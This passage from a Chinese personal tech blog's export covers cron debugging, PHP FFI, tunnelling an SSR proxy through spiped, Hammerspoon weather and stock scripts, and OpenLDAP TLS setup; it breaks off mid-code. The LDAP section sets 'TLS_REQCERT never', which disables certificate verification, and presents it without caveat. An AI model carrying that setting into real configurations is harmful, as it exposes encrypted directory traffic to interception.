class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://github.com/ushell/learncode/blob/master/crontab/debian/cron-3.0pl1/misc.c#L329</span></span><br><span class="line"><span class="comment">/* get_string(str, max, file, termstr) : like fgets() but</span></span><br><span class="line"><span class="comment"> *(1) has terminator string which should include \n</span></span><br><span class="line"><span class="comment"> *(2) will always leave room for the null</span></span><br><span class="line"><span class="comment"> *(3) uses get_char() so LineNumber will be accurate</span></span><br><span class="line"><span class="comment"> *(4) returns EOF or terminating character, whichever</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">get_string(<span class="built_in">string</span>, size, file, terms)</span><br><span class="line"><span class="keyword">char</span>*<span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">int</span>size;</span><br><span class="line">FILE*file;</span><br><span class="line"><span class="keyword">char</span>*terms;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span>ch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (EOF != (ch = get_char(file)) &amp;&amp; !<span class="built_in">strchr</span>(terms, ch)) &#123;</span><br><span class="line"><span class="keyword">if</span> (size &gt; <span class="number">1</span>) &#123;</span><br><span class="line">*<span class="built_in">string</span>++ = (<span class="keyword">char</span>) ch;</span><br><span class="line">size--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &gt; <span class="number">0</span>)</span><br><span class="line">*<span class="built_in">string</span> = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x4-手工调试"><a href="#0x4-手工调试" class="headerlink" title="0x4.手工调试"></a>0x4.手工调试</h2><p>基于Debian系统的crontab没有日志记录，调试代码时需要打开    cron.h文件中<code>DEBUGGING</code>；重新编译后，crontab执行时会打印一些关键的DEBUG信息方便排查。</p><p>注意编译后参数-x的值问题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">示例</span></span><br><span class="line">./cron -x ext,proc,pars,load  #参考cron.h中的DebugFlags</span><br></pre></td></tr></table></figure><h2 id="0x5-总结"><a href="#0x5-总结" class="headerlink" title="0x5.总结"></a>0x5.总结</h2><p>crontab是Linux环境中最常用的定时任务执行程序，由于操作系统不同crontab的实现方式也不一样。在Docker环境中，基于Debian系统使用的是<code>3.0pl1-127</code>版本，Alpine系统中使用的busybox版本。前者程序比较完善但是不支持日志记录(需要修改源码), 后者比较轻量级支持前后台及日志记录等功能。</p><p>由于crontab最新一版的更新是2004年左右，Debian系统打算采用<code>cronie</code>代替目前crontab。业务系统中可以根据其他版本的定时程序代替。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=543895">bug#543895</a></li><li><a href="https://wiki.debian.org/cron">DebianCronWiki</a></li><li><a href="https://wiki.debian.org/Locale">LocaleWiki</a></li><li><a href="http://blog.chinaunix.net/uid-20682147-id-4977039.html">crontab原理分析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> crontab </tag>
            
            <tag> debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP7.4的新功能FFI</title>
      <link href="2019/12/11/php7-4%E7%9A%84%E6%96%B0%E5%8A%9F%E8%83%BDFFI/"/>
      <url>2019/12/11/php7-4%E7%9A%84%E6%96%B0%E5%8A%9F%E8%83%BDFFI/</url>
      
        <content type="html"><![CDATA[<p>PHP在7.4版本提供一个有意思的扩展FFI(Foreign Function Interface)，使PHP可以调用C语言的函数，该扩展由PHP核心开发者Dmitry Stogov开发。其实跨语言调用已经很常见的需求，虽然看着比较怪异，更多的是一种折中实现wrapper。FFI的出现降低对开发PHP扩展的依赖，在此之前如果调用某些C语言编写的库时，需要以开发PHP扩展形式进行封装；即使有zephir这样的工具，依然增加学习成本。</p><h2 id="示例"><a href="#示例" class="headerlink" title="#示例"></a>#示例</h2><h2 id="缺点"><a href="#缺点" class="headerlink" title="#缺点"></a>#缺点</h2><h2 id="总结"><a href="#总结" class="headerlink" title="#总结"></a>#总结</h2><h2 id="参考"><a href="#参考" class="headerlink" title="#参考"></a>#参考</h2><ul><li><a href="https://jolicode.com/blog/php-7-4-ffi-what-you-need-to-know">PHP 7.4 FFI: What you need to know</a></li><li><a href="https://learnku.com/articles/24756">PHP 7.4 前瞻：FFI</a></li><li><a href="https://www.php.net/manual/zh/class.ffi.php">PHP FFI官网文档</a></li><li><a href="https://github.com/dstogov/php-ffi">PHP FFI源码</a></li><li><a href="https://wiki.php.net/rfc/ffi">PHP FFI RFC</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ffi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSR流量加密</title>
      <link href="2019/09/24/SSR%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/"/>
      <url>2019/09/24/SSR%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>酸酸乳流浪在外，总会有坏人在酸酸乳回家的路上时常打劫她。英勇的你应该如何保护你家可爱的酸酸乳呢？纵观魔法世界，无外乎加密或混淆。混淆算是道高一尺，魔高一丈；还是魔高一尺，道高一丈呢？真真假假倒不如挖条专门的路让酸酸乳可以愉快的玩耍，这里使用spiped方案来实现。</p><p>spiped是Tarsnap项目中的一个加密通信工具，另外还有著名的加密工具scrypt, 目前已开源到<a href="https://github.com/Tarsnap/spiped">同人社区</a>, 该工具使用AES加密通信，支持socket端口加密转发，类似SSH代理，工作原理参考<a href="https://www.tarsnap.com/spiped.html">官方文档</a></p><p>本文不讨论酸酸乳配置，只是讨论给酸酸乳套件衣服。</p><h2 id="spiped配置"><a href="#spiped配置" class="headerlink" title="#spiped配置"></a>#spiped配置</h2><ul><li><p>下载源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Tarsnap/spiped.git</span><br></pre></td></tr></table></figure></li><li><p>依赖安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> OpenSSL依赖 (OSX系统)</span></span><br><span class="line">export LDFLAGS=&quot;-L /usr/local/Cellar/openssl/1.0.2r/lib&quot; CFLAGS=&quot;-I /usr/local/Cellar/openssl/1.0.2r/include&quot; </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure></li><li><p>spiped</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> spipe测试工具</span></span><br><span class="line">spipe/spipe</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> spiped主程序</span>  </span><br><span class="line">spiped/spiped </span><br></pre></td></tr></table></figure></li></ul><h2 id="酸酸乳配置"><a href="#酸酸乳配置" class="headerlink" title="#酸酸乳配置"></a>#酸酸乳配置</h2><ul><li><p>流量流通示例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地请求流量 -&gt; 本地酸酸乳服务 -&gt; 本地spiped服务 &lt;-----&gt; 服务器spiped服务 -&gt; 服务器本地酸酸乳服务 -&gt; 外面的世界</span><br></pre></td></tr></table></figure></li><li><p>spiped密钥生成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 复制该密钥到服务器上</span></span><br><span class="line">dd if=/dev/urandom bs=32 count=1 &gt; secret.key</span><br></pre></td></tr></table></figure></li><li><p>spiped客户端运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spiped -e -s &#x27;127.0.0.1:10086&#x27; -t 服务器IP:服务器端口 -k secret.key</span><br></pre></td></tr></table></figure></li><li><p>spiped服务端运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spiped -d -s &#x27;0.0.0.0:服务器端口&#x27; -t &#x27;127.0.0.1:酸酸乳端口&#x27; -k secret.key</span><br></pre></td></tr></table></figure></li><li><p>配置本地酸酸乳端口</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务器配置: 127.0.0.1 端口<span class="selector-pseudo">:10086</span></span><br></pre></td></tr></table></figure></li></ul><p>注意: 酸酸乳服务端尽量127运行，不要暴露到外面；spiped服务端口暴露的端口尽量是常用服务端口</p><p>缺点: 由于给酸酸乳套了层衣服，手机端是不能使用的！</p><p>同类型的服务还有stunnel…</p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssr </tag>
            
            <tag> spipe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hammerspoon提高生产力</title>
      <link href="2019/09/08/hammerspoon%E6%8F%90%E9%AB%98%E7%94%9F%E4%BA%A7%E5%8A%9B/"/>
      <url>2019/09/08/hammerspoon%E6%8F%90%E9%AB%98%E7%94%9F%E4%BA%A7%E5%8A%9B/</url>
      
        <content type="html"><![CDATA[<p>hammerspoon是MacOS系统下一款实现自动化的工具，通过lua脚本扩展系统功能。相比其他通过python脚本，nodejs脚本或原生的automator, hammerspoon更加简单，提示框界面美观。也可以使用python和pync库实现监控通知，nodejs和node-notifier组件实现通知的方案。毕竟工具的自动化是提高生产力的必要因素。</p><h2 id="配置"><a href="#配置" class="headerlink" title="#配置"></a>#配置</h2><p>hammerspoon可以使用brew安装，也可以直接在官网下载二进制文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">github下载页面</span></span><br><span class="line">https://github.com/Hammerspoon/hammerspoon/releases</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">brew安装</span></span><br><span class="line">brew install hammerspoon</span><br></pre></td></tr></table></figure><p>安装完成后，在<code>启动台</code>中可以看到已安装的hammerspoon图标, MacOS的菜单栏上会显示一个锤子图标。</p><p>hammerspoon默认配置文件是<code>~/.hammerspoon/init.lua</code></p><p>配置文件目录</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.hammerspoon</span></span><br><span class="line">├── <span class="selector-tag">Spoons</span></span><br><span class="line">├── <span class="selector-tag">init</span><span class="selector-class">.lua</span></span><br><span class="line">└── <span class="selector-tag">weather</span></span><br><span class="line">    └── <span class="selector-tag">weather</span><span class="selector-class">.lua</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="功能"><a href="#功能" class="headerlink" title="#功能"></a>#功能</h2><p>在hammerspoon文档中，支持运行应用、电池管理、window窗口管理、对话框、网络管理等等功能；其中hammerspoon提供了一个hs.http库用来实现http相关请求功能。</p><p>以<code>天气功能</code>为示例来了解hammerspoon使用</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 编辑weather/weather.lua</span></span><br><span class="line"><span class="comment">-- 天气接口使用tianqiapi免费接口, 需要简单注册获取ID及密码</span></span><br><span class="line"><span class="keyword">local</span> urlApi = <span class="string">&#x27;https://www.tianqiapi.com/api/?version=v1&amp;appid=申请ID&amp;appsecret=申请密码&#x27;</span></span><br><span class="line"><span class="keyword">local</span> menubar = hs.menubar.new()</span><br><span class="line"><span class="keyword">local</span> menuData = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 天气图标</span></span><br><span class="line"><span class="keyword">local</span> weaEmoji = &#123;</span><br><span class="line">   lei = <span class="string">&#x27;⛈&#x27;</span>,</span><br><span class="line">   qing = <span class="string">&#x27;☀️&#x27;</span>,</span><br><span class="line">   shachen = <span class="string">&#x27;😷&#x27;</span>,</span><br><span class="line">   wu = <span class="string">&#x27;🌫&#x27;</span>,</span><br><span class="line">   xue = <span class="string">&#x27;❄️&#x27;</span>,</span><br><span class="line">   yu = <span class="string">&#x27;🌧&#x27;</span>,</span><br><span class="line">   yujiaxue = <span class="string">&#x27;🌨&#x27;</span>,</span><br><span class="line">   yun = <span class="string">&#x27;☁️&#x27;</span>,</span><br><span class="line">   zhenyu = <span class="string">&#x27;🌧&#x27;</span>,</span><br><span class="line">   yin = <span class="string">&#x27;⛅️&#x27;</span>,</span><br><span class="line">   default = <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateMenubar</span><span class="params">()</span></span></span><br><span class="line"> menubar:setTooltip(<span class="string">&quot;天气预报&quot;</span>)</span><br><span class="line">    menubar:setMenu(menuData)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getWeather</span><span class="params">()</span></span></span><br><span class="line">   <span class="comment">-- 请求API接口</span></span><br><span class="line">   hs.http.doAsyncRequest(urlApi, <span class="string">&quot;GET&quot;</span>, <span class="literal">nil</span>,<span class="literal">nil</span>, <span class="function"><span class="keyword">function</span><span class="params">(code, body, htable)</span></span></span><br><span class="line">      <span class="keyword">if</span> code ~= <span class="number">200</span> <span class="keyword">then</span></span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&#x27;get weather error:&#x27;</span>..code)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      rawjson = hs.json.decode(body)</span><br><span class="line">      city = rawjson.city</span><br><span class="line">      menuData = &#123;&#125;</span><br><span class="line">      <span class="comment">-- 处理数据，更新到菜单栏里</span></span><br><span class="line">      <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>(rawjson.data) <span class="keyword">do</span></span><br><span class="line">         <span class="keyword">if</span> k == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">            menubar:setTitle(weaEmoji[v.wea_img])</span><br><span class="line">            titlestr = <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s %s %s 🌡️%s 💧%s 💨%s 🌬 %s %s&quot;</span>, city,weaEmoji[v.wea_img],v.day, v.tem, v.humidity, v.air, v.win_speed, v.wea)</span><br><span class="line">            item = &#123; title = titlestr &#125;</span><br><span class="line">            <span class="built_in">table</span>.<span class="built_in">insert</span>(menuData, item)</span><br><span class="line">            <span class="built_in">table</span>.<span class="built_in">insert</span>(menuData, &#123;title = <span class="string">&#x27;-&#x27;</span>&#125;)</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">            <span class="comment">-- titlestr = string.format(&quot;%s %s %s %s&quot;, v.day, v.wea, v.tem, v.win_speed)</span></span><br><span class="line">            titlestr = <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s %s %s 🌡️%s 🌬%s %s&quot;</span>, city, weaEmoji[v.wea_img],v.day, v.tem, v.win_speed, v.wea)</span><br><span class="line">            item = &#123; title = titlestr &#125;</span><br><span class="line">            <span class="built_in">table</span>.<span class="built_in">insert</span>(menuData, item)</span><br><span class="line">         <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      updateMenubar()</span><br><span class="line">   <span class="keyword">end</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">menubar:setTitle(<span class="string">&#x27;⌛&#x27;</span>)</span><br><span class="line">getWeather()</span><br><span class="line">updateMenubar()</span><br><span class="line"><span class="comment">-- 定时任务</span></span><br><span class="line">hs.timer.doEvery(<span class="number">3600</span>, getWeather)</span><br></pre></td></tr></table></figure><p>示例二：定时获取股票行情</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 相关代码已更新到Github</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> XQAPI = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">local</span> menubar = hs.menubar.new()</span><br><span class="line"><span class="keyword">local</span> menuData = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> stockList = <span class="string">&#x27;SH000001&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateMenubar</span><span class="params">()</span></span></span><br><span class="line">    menubar:setMenu(menuData)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getStock</span><span class="params">(fisrt)</span></span></span><br><span class="line">fisrt = fisrt <span class="keyword">or</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 请求服务</span></span><br><span class="line">api = <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s/?symbol=%s&quot;</span>, XQAPI, stockList)</span><br><span class="line">hs.http.doAsyncRequest(api, <span class="string">&quot;GET&quot;</span>, <span class="literal">nil</span>, headers, <span class="function"><span class="keyword">function</span><span class="params">(code, body, htable)</span></span></span><br><span class="line">  <span class="keyword">if</span> code ~= <span class="number">200</span> <span class="keyword">then</span></span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&#x27;获取数据错误:&#x27;</span>..code)</span><br><span class="line">     <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  menuData = &#123;&#125;</span><br><span class="line"></span><br><span class="line">  rawjson = hs.json.decode(body)</span><br><span class="line">  <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>(rawjson.data) <span class="keyword">do</span></span><br><span class="line">  <span class="comment">-- 菜单样式</span></span><br><span class="line">  titles = <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;🇨🇳%s ¥%s 🚀%s 👆%s 👇︎%s 🚗%s 💰%.3f/亿 🤝%s&quot;</span>,</span><br><span class="line">  v.symbol, v.current, v.percent..<span class="string">&#x27;%&#x27;</span>, v.high, v.low, v.<span class="built_in">open</span>, v.amount/<span class="number">100000000</span>, v.turnover_rate..<span class="string">&#x27;%&#x27;</span></span><br><span class="line">  )</span><br><span class="line">            <span class="built_in">table</span>.<span class="built_in">insert</span>(menuData, &#123;title = titles&#125;)</span><br><span class="line">        <span class="keyword">end</span>    </span><br><span class="line">  updateMenubar()</span><br><span class="line"><span class="keyword">end</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">menubar:setTitle(<span class="string">&#x27;🚨&#x27;</span>)</span><br><span class="line">getStock(<span class="literal">true</span>)</span><br><span class="line">updateMenubar()</span><br><span class="line">hs.timer.doEvery(<span class="number">600</span>, getStock)</span><br></pre></td></tr></table></figure><p>hammerspoon可以实现自动化功能还有很多，仅通过<code>hs.http</code>和 <code>hs.timer</code>功能就可以监控实时某些服务稳定性，怎么玩出花样还是依赖各位看官们的脑洞了 :)</p><h2 id="参考"><a href="#参考" class="headerlink" title="#参考"></a>#参考</h2><p><a href="https://www.hammerspoon.org/docs">hammerspoon官方文档</a><br><a href="https://github.com/ashfinal/awesome-hammerspoon">hammerspoon awsome项目</a><br><a href="https://coolshell.cn/articles/10739.html">lua十分钟教程</a></p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hammerspoon </tag>
            
            <tag> 自动化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LDAP配置TLS加密通信</title>
      <link href="2019/08/27/LDAP%E9%85%8D%E7%BD%AETLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1/"/>
      <url>2019/08/27/LDAP%E9%85%8D%E7%BD%AETLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<p>LDAP在企业开发中常用的一种协议，实现企业账户统一管理的方案。常用的LDAP开源方案主要是openldap, Debian系列和CentOS系统都会自带，但需要注意配置文件不同。在基于LDAP开发相关功能时，由于LDAP协议属于明文协议，业务对安全性要求较高的场合需要搭配TLS完成对数据加密传输。LDAP默认支持TLS协议，开放的端口是636。</p><h2 id="0x1-基础配置"><a href="#0x1-基础配置" class="headerlink" title="0x1 基础配置"></a>0x1 基础配置</h2><p>openldap服务配置TLS:</p><ul><li><p>slapd手动运行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#openldap v2.4.44版本自带TLS，无需配置, slapd需要指定 &quot;ldaps:///&quot;</span></span><br><span class="line"><span class="regexp">/usr/</span>sbin<span class="regexp">/slapd -u ldap -h ldap:/</span><span class="regexp">//</span> ldaps:<span class="regexp">//</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></li><li><p>service服务运行 (CentOS环境)</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#vim /etc/sysconfig/slapd</span></span><br><span class="line">service slapd <span class="literal">start</span></span><br></pre></td></tr></table></figure></li><li><p>验证</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> uax|<span class="keyword">grep</span> slapd</span><br><span class="line"></span><br><span class="line">lsof -i:<span class="number">636</span></span><br></pre></td></tr></table></figure></li></ul><p>openldap docker服务配置(简易):</p><ul><li>环境变量设置<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 替换成自己的证书或使用自带证书</span></span><br><span class="line"><span class="attr">LDAP_TLS:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">LDAP_TLS_CRT_FILENAME:</span> <span class="string">ldap.crt</span></span><br><span class="line"><span class="attr">LDAP_TLS_KEY_FILENAME:</span> <span class="string">ldap.key</span></span><br><span class="line"><span class="attr">LDAP_TLS_DH_PARAM_FILENAME:</span> <span class="string">dhparam.pem</span></span><br><span class="line"><span class="attr">LDAP_TLS_CA_CRT_FILENAME:</span> <span class="string">ca.crt</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="0x2-开发使用"><a href="#0x2-开发使用" class="headerlink" title="0x2 开发使用"></a>0x2 开发使用</h2><p>经过以上简单配置，ldap已经支持TLS传输数据了。开发语言中实现ldap客户端的方式不同，需要注意开发语言官方文档</p><ul><li>PHP客户端</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 系统需要安装cryus-sasl库</span></span><br><span class="line">yum install cyrus-sasl cyrus-sasl-devel cyrus-sasl-ldap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装ldap扩展(phpbrew示例)</span></span><br><span class="line">phpbrew ext install ldap --  --with-ldap=/usr/local/Cellar/openldap/<span class="number">2.4</span><span class="number">.47</span> --with-ldap-sasl=/usr/local/opt/cyrus-sasl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看配置信息 (注意`SASL Support`启用状态)</span></span><br><span class="line">php --ri ldap</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#本地代码运行环境配置ldap.conf (php的ldap依赖这个配置文件)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;TLS_REQCERT never&quot;</span> &gt;&gt; /etc/openldap/ldap.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例代码一</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">389</span>; <span class="comment">#注意端口</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;cn=username,ou=people,dc=test,dc=com&#x27;</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;123456&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = ldap_connect(<span class="variable">$host</span>, <span class="variable">$port</span>);</span><br><span class="line"><span class="comment">#调试信息</span></span><br><span class="line">ldap_set_option(<span class="variable">$conn</span>, LDAP_OPT_PROTOCOL_VERSION, <span class="number">3</span>);</span><br><span class="line">ldap_set_option(<span class="literal">NULL</span>, LDAP_OPT_DEBUG_LEVEL, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># tls开启 (使用的是ldap_start_tls函数)</span></span><br><span class="line">ldap_start_tls(<span class="variable">$conn</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 认证</span></span><br><span class="line"><span class="variable">$auth</span> = ldap_bind(<span class="variable">$conn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$auth</span> ? <span class="string">&quot;ok&quot;</span> : <span 